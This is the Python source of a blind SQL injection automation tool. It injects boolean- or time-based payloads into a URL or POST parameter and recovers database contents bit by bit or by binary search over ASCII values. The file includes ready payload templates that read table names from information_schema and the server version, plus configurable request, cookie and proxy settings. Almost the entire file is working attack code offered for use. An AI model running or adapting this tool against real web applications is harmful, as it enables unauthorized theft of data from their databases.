#!/usr/bin/env python
# TODO:
#   Make it possible to provide a request in a file, parse that request and use it for cookies, headers, etc.
#   Save state from a log file. With an argument, use the last file to continue the injection according to the command line and last results found in the file.
#   Right now, a length or count of more than 128 is not possible. However, it takes more requests to find a bigger length/count than actually do 7 requests that give a null byte in the end. Therefore, make it either that the length/count is only available for ASCII search or find a better/faster algorithm.
#   Improve the ASCII search to make it more efficient (also either force the usage of "BETWEEN ... AND..." or implement the possibility to do lesser than or greater than).
#

import os
import sys
import copy
import json
import time
import urllib3
import logging
import argparse
import requests
import traceback

from datetime import datetime
from logging import NOTSET, DEBUG, INFO, WARNING, ERROR, CRITICAL, FATAL

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LOGGING_LEVEL = {
    "debug" : DEBUG,
    "info" : INFO,
    "warning" : WARNING,
    "error" : ERROR,
    "critical" : CRITICAL,
}

class Singleton(type):
    _instances = {}
    def __call__(cls, *args, **kwargs):
        if cls not in cls._instances:
            cls._instances[cls] = super(Singleton, cls).__call__(*args, **kwargs)
        return cls._instances[cls]

class ColoredFormatter(logging.Formatter):
    COLOR_SEQ = "\033[1;{}m"
    RESET_SEQ = "\033[0m"

    COLORS = {
        'DEBUG': 6,
        'INFO': 4,
        'WARNING': 3,
        'ERROR': 1,
        'CRITICAL': 1,
        'FATAL': 1,
    }

    def __init__(self, fmt, useColor=True):
        logging.Formatter.__init__(self, fmt)
        self.__useColor = useColor

    def format(self, record):
        if self.__useColor and record.levelname in self.COLORS:
            record.msg = "{color}{msg}{reset}".format(color=self.COLOR_SEQ.format(30 + self.COLORS[record.levelname]),msg=record.msg,reset=self.RESET_SEQ)
            record.msg = "{color}{msg}{reset}".format(color=self.COLOR_SEQ.format(30 + self.COLORS[record.levelname]),msg=record.msg,reset=self.RESET_SEQ)

        return logging.Formatter.format(self, record)

    def toggleUseColor(self, useColor):
        self.__useColor = useColor
        
class Logger(object, metaclass=Singleton):
    def __init__(self, directory="results"):
        logfilename = "{dir}/{fname}.{ext}".format(dir=directory, fname=datetime.utcnow().strftime("%Y-%m-%d_%H%M%S.%f"), ext="txt")
        self.__logger = logging.getLogger(logfilename)
        self.__logger.setLevel(DEBUG)

        self.__fh = logging.FileHandler(logfilename)
        self.__fh.setLevel(DEBUG)
        self.__fh.setFormatter(logging.Formatter(fmt="[%(levelname)s] %(asctime)s - %(message)s", datefmt="%Y-%m-%d %H:%M:%S"))

        self.__colorFormatter = ColoredFormatter(fmt="%(message)s", useColor=False)

        self.__sh = logging.StreamHandler()
        self.__sh.setLevel(DEBUG)
        self.__sh.setFormatter(self.__colorFormatter)

        self.__logger.addHandler(self.__fh)
        self.__logger.addHandler(self.__sh)
        
    def __getattr__(self, attr):
        return self.__logger.__getattribute__(attr)

    def updateStreamLevel(self, level):
        self.__logger.setLevel(level)

    def updateUseColor(self, useColor):
        self.__colorFormatter.toggleUseColor(useColor)

class SQLPlease(object):
    def __init__(self, *args, **kwargs):
        for k, v in kwargs.items():
            self.__dict__[k] = v

        Logger().info(json.dumps(self.__dict__))

        self.__time = None
        self.__amountOfRequests = 0

    def doInjection(self, *args, **kwargs):
        self.__time = time.time()
        answers = []
        offsetIndex = len(answers)

        originalPayload = self.payload
        originalCountRowsPayload = self.countRows
        originalFindLengthPayload = self.findLength

        # Delete the keywords countRows and findLength so if they are not set, the script will not get confused during the extraction.
        del self.countRows
        del self.findLength
        
        # If the query only fetch one thing (example (SELECT @@version)), then make the count at 1.
        if(not "{offsetIndex}" in originalPayload):
            count = 1
        else:
            count = 0
        
        try:
            while count == 0 or offsetIndex < count:
                if(originalCountRowsPayload and count == 0):
                    # Set back the keyword countRows so the function knows it's for a count.
                    self.countRows = originalCountRowsPayload
                    self.payload = originalCountRowsPayload.format(bitIndex="{bitIndex}") if self.useBinary else originalCountRowsPayload

                    # Keep the count variable for this loop, no need to put it in the kwargs.
                    if(self.useBinary):
                        count = self.injectionBinary(*args, **kwargs)
                    else:

                        count = self.injectionAscii(*args, **kwargs)
                    
                    Logger().info("Counted {} rows".format(count))
                    
                    # Delete back the keyword countRows.
                    del self.countRows

                if(originalFindLengthPayload):
                    # Set back the keyword findLength so the function knows it's for a word length.
                    self.findLength = originalFindLengthPayload
                    self.payload = originalFindLengthPayload.format(bitIndex="{bitIndex}", offsetIndex=offsetIndex) if self.useBinary else originalFindLengthPayload.format(ascii="{ascii}", offsetIndex=offsetIndex)

                    # Set the length in the kwards so the function knows that it is useless to extract a final character equal to a null byte.
                    if(self.useBinary):
                        self.length = self.injectionBinary(*args, **kwargs)
                    else:
                        self.length = self.injectionAscii(*args, **kwargs)

                    if(self.length == ""):
                        Logger().warning("Find length failed, continue the execution without finding length.".format(self.length))
                        del originalFindLengthPayload
                        del self.length
                    else:
                        Logger().info("Next word of length {}".format(self.length))
                    
                    # Delete back the keyword findLength.
                    del self.findLength

                self.payload = originalPayload.format(charIndex="{charIndex}", bitIndex="{bitIndex}", offsetIndex=offsetIndex, max="{max}") if self.useBinary else originalPayload.format(charIndex="{charIndex}", ascii="{ascii}", offsetIndex=offsetIndex, max="{max}")

                if(self.useBinary):
                    answer = self.injectionBinary(*args, **kwargs)
                else:
                    answer = self.injectionAscii(*args, **kwargs)

                if(answer == ""):
                    break
                else:
                    # More of a safety net although not necessary since if the argument to find lengths is there, it should be refreshed for every single word extracted.
                    if("length" in self.__dict__): del self.length

                    answers.append(answer)
                    offsetIndex += 1

                    Logger().warning(answer)
                    Logger().debug(", ".join(answers))
        except KeyboardInterrupt:
            Logger().info("Stopped by keyboard interruption.")
        except Exception as e:
            Logger().critical(traceback.format_exc())
        finally:
            if(answers):
                Logger().warning(", ".join(answers))
            else:
                Logger().info("No results.")
            Logger().info("Finished {} requests".format(self.__amountOfRequests))
            Logger().info("Elasped time: {}".format(time.time() - self.__time))

    def injectionAscii(self, *args, **kwargs):
        MIN = self.minAscii
        MAX = self.maxAscii

        continuing = True

        answer = ""
        charIndex = len(answer)+1
        
        minAscii = MIN if not "countRows" in self.__dict__ and not "findLength" in self.__dict__ else 0
        maxAscii = MAX if not "countRows" in self.__dict__ and not "findLength" in self.__dict__ else 1000
        currentAscii = int((minAscii+maxAscii)/2)

        tested = {}
        amountOfRequests = 0

        try:
            while continuing:
                if("length" in self.__dict__ and charIndex == self.length+1):
                    Logger().debug("Found {} in {} requests".format(answer, amountOfRequests))
                    self.__amountOfRequests += amountOfRequests
                    return answer

                if(self.sleep > 0):
                    time.sleep(self.sleep)
                
                data = copy.deepcopy(self.data)

                payload = self.payload.format(charIndex=charIndex, ascii=currentAscii, max=maxAscii)
                if("parameter" in self.__dict__ and self.parameter in data[self.type]):
                    data[self.type][self.parameter] = data[self.type][self.parameter].format(payload=payload)
                
                url = self.url.format(payload=payload)
                r = requests.__getattribute__(self.method)(url, **data, **self.requests)
                amountOfRequests += 1

                condition = False
                if(self.timeBased > 0):
                    condition = r.elapsed.total_seconds() > self.timeBased
                elif(self.booleanBased != ""):
                    condition = eval(self.booleanBased)

                tested[currentAscii] = condition

                if(condition): #true
                    minAscii = currentAscii
                    currentAscii = int((minAscii+maxAscii)/2)
                else:
                    maxAscii = currentAscii
                    currentAscii = int((minAscii+maxAscii)/2)

                if(currentAscii in tested and currentAscii+1 in tested and tested[currentAscii] != tested[currentAscii+1] and tested[currentAscii]):
                    if("countRows" in self.__dict__ or "findLength" in self.__dict__):
                        Logger().debug("Found {} in {} requests".format(currentAscii, amountOfRequests))
                        self.__amountOfRequests += amountOfRequests
                        return currentAscii

                    answer += chr(currentAscii)
                    Logger().debug("Found {} - {}".format(currentAscii, answer))
                    minAscii = MIN
                    maxAscii = MAX
                    currentAscii = int((minAscii+maxAscii)/2)
                    charIndex+=1
                    del tested
                    tested = {}
                elif(currentAscii == minAscii):
                    Logger().debug("Found {} in {} requests".format(answer, amountOfRequests))
                    self.__amountOfRequests += amountOfRequests
                    return answer
        except KeyboardInterrupt:
            Logger().warning(answer)
            raise KeyboardInterrupt
        except Exception as e:
            raise e

    def injectionBinary(self, *args, **kwargs):
        binary = ""
        bitIndex = len(binary)+1
        
        answer = ""
        charIndex = len(answer)+1

        amountOfRequests = 0

        try:
            while True:
                if("length" in self.__dict__ and charIndex == self.length+1):
                    Logger().debug("Found {} in {} requests".format(answer, amountOfRequests))
                    self.__amountOfRequests += amountOfRequests
                    return answer

                if(self.sleep > 0):
                    time.sleep(self.sleep)
                
                data = copy.deepcopy(self.data)
                payload = self.payload.format(charIndex=charIndex, bitIndex=bitIndex)

                if("parameter" in self.__dict__ and self.parameter in data[self.type]):
                    data[self.type][self.parameter] = data[self.type][self.parameter].format(payload=payload)
                
                url = self.url.format(payload=payload)
                r = requests.__getattribute__(self.method)(url, **data, **self.requests)
                amountOfRequests += 1

                condition = False
                if(self.timeBased > 0):
                    condition = r.elapsed.total_seconds() > self.timeBased
                elif(self.booleanBased != ""):
                    condition = eval(self.booleanBased)

                if(condition): #true
                    binary += "1"
                else:
                    binary += "0"

                Logger().debug("Found {}".format(binary[::-1]))
                if(bitIndex == 8):
                    char = int(binary[::-1],2)
                    if("findLength" in self.__dict__ or "countRows" in self.__dict__): 
                        Logger().debug("Found {} in {} requests".format(char, amountOfRequests))
                        self.__amountOfRequests += amountOfRequests
                        return char

                    if(char == 0):
                        Logger().debug("Found {} in {} requests".format(answer, amountOfRequests))
                        self.__amountOfRequests += amountOfRequests
                        return answer

                    answer += chr(char)
                    Logger().debug("Found {} - {}".format(binary[::-1], answer))
                    binary = ""
                    bitIndex = 1
                    charIndex += 1
                else:
                    bitIndex += 1
        except KeyboardInterrupt:
            Logger().warning(answer)
            raise KeyboardInterrupt
        except Exception as e:
            raise e

if __name__ == '__main__':
    directory = ""
    level = ""
    useColor = False
    kwargs = {"requests":{}}
    
    """ Payload requires some attributes in order for it to work.
            Both:
                {charIndex}:
                    Mandatory. Character index of a string. Example: `SUBSTRING(...,{charIndex},1)`
                {offsetIndex}:
                    Mandatory. Offset of the row. Example: `LIMIT {offsetIndex}, 1`

            ASCII:
                {ascii}:
                    Mandatory. Minimum inclusive ASCII value. 32 if printable only, else 0. Example: `ASCII(...)>={ascii}`
                {max}:
                    Optional. Maximum inclusive ASCII value. 126 if printable only, else 255. Example: `ASCII(...) BETWEEN {ascii} AND {max}`

                Example: `ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {offsetIndex},1),{charIndex},1))>={ascii}`

            Binary:
                {bitIndex}:
                    Mandatory. Bit index of a character. Example: `SUBSTRING(REVERSE(BIN(ASCII(SUBSTRING(...)))),{bitIndex},1)=1`

                Example: `SUBSTRING(REVERSE(BIN(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {offsetIndex},1),{charIndex},1)))),{bitIndex},1)=1`

        To know where to inject the payload, the URL or the data must contain the keywork {payload}.
            Example: `url = http://127.0.0.1/?sort=(CASE WHEN ({payload}) THEN id ELSE name END)`
            Example: `data = {"sort":"(CASE WHEN ({payload}) THEN id ELSE name END)"}`
    """
    kwargs["payload"] = "substring(reverse(bin(ascii(substring((select table_name from information_schema.tables limit {offsetIndex},1),{charIndex},1)))),{bitIndex},1)=1"
    kwargs["payload"] = "substring(reverse(bin(ascii(substring((select @@version),{charIndex},1)))),{bitIndex},1)=1"
    #kwargs["payload"] = "ascii(substring((select table_name from information_schema.tables limit {offsetIndex},1),{charIndex},1))>={ascii}"
    #kwargs["payload"] = "ascii(substring((select @@version),{charIndex},1)) between {ascii} and {max}"
    kwargs["payload"] = "ascii(substring((select @@version),{charIndex},1)) >= {ascii}"
    
    # Request Method
    kwargs["method"] = "get".lower()

    # URL
    # Example: `http://127.0.0.1/?sort=(CASE WHEN ({payload}) THEN id ELSE name END)`
    kwargs["url"] = "http://127.0.0.1/"

    # POST data URL encoded or JSON.
    # Example: `{"sort":"(CASE WHEN ({payload}) THEN id ELSE name END)"}`
    kwargs["data"] = {}

    # True if you want to send JSON data instead of URL encoded (False)
    kwargs["isDataJson"] = False

    # If you want to count the number of rows prior extracting them, use the following parameter. However, it may not work properly and increase the duration of the script.
    # Example: `(select count(table_name) from information_schema.tables)>{ascii}`
    kwargs["countRows"] = "" 
    
    # If you want to find the length of the word to extract prior extracting it, use the following parameter. However, it may not work properly and increase the duration of the script.
    # Example: `(select length(@@version))>{ascii}`
    kwargs["findLength"] = "" 

    # minAscii and maxAscii are INCLUSIVE. Meaning that your payload must use GREATER THAN {ascii}.
    kwargs["minAscii"] = 32
    kwargs["maxAscii"] = 126
    
    # True if you want to use binary instead of ASCII (False)
    kwargs["useBinary"] = True

    # Sleep in second between each request. This is mostly used to slow down the script.
    kwargs["sleep"] = 0


    # The following parameter is used if you want to use boolean. The value of the parameter will be evaluated in order to know if it is true where `r` is the object containing the result of the requests.
    # Example: `"Found" in r.text` 
    # Example: `1 == r.json()["results"][0]["id"]`
    kwargs["booleanBased"] = "\"<tr>\" in r.text"
    
    # True if you want to use time instead of boolean (False)
    kwargs["timeBased"] = False

    # Requests parameters.
    #   verify: validate SSL/TLS certificates.
    #   allow_redirects: follow HTTP status 302.
    #   proxies: Example: `{"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}`
    kwargs["requests"]["verify"] = False
    kwargs["requests"]["allow_redirects"] = False
    kwargs["requests"]["cookies"] = {}
    kwargs["requests"]["headers"] = {}
    kwargs["requests"]["proxies"] = {}
    
    # If the variable directory is not set, the logs will be stored in ./results/
    if(not directory):
        directory = os.path.join(os.path.dirname(os.path.realpath(__file__)), "results")

    # If the directory for logging does not exist, create it.
    if(not os.path.exists(directory)):
        os.mkdir(directory)
    Logger(directory)
    
    if(useColor):
        Logger().updateUseColor(useColor)

    if(level and level.lower() in LOGGING_LEVEL):
        Logger().updateStreamLevel(LOGGING_LEVEL[level.lower()])
    else:
        Logger().updateStreamLevel(LOGGING_LEVEL["info"])

    # If the keyword {payload} is not found in URL or DATA, stop the script.
    if(not "{payload}" in kwargs["url"] and (not kwargs["data"] or not "{payload}" in json.dumps(kwargs["data"]))):
        Logger().error("Use the keyword {payload} (case sensitive) in the url or data parameters to make the program understand where to inject the payload.")
        sys.exit(1)

    # Keep the name of the parameter that includes the keyword {payload}.
    # TODO: the keyword {payload} can be deeper than the first layer. Create a recursive routine to find the keyword.
    if(kwargs["data"]):
        kwargs["type"] = "data" if not kwargs["isDataJson"] else "json"
        p = ""
        for k,v in kwargs["data"].items():
            if(isinstance(v, str)):
                if("{payload}" in v):
                    kwargs["parameter"] = k
                    break
        kwargs["data"] = {kwargs["type"]: kwargs["data"]}
    else:
        kwargs["data"] = {}

    SQLPlease(**kwargs).doInjection()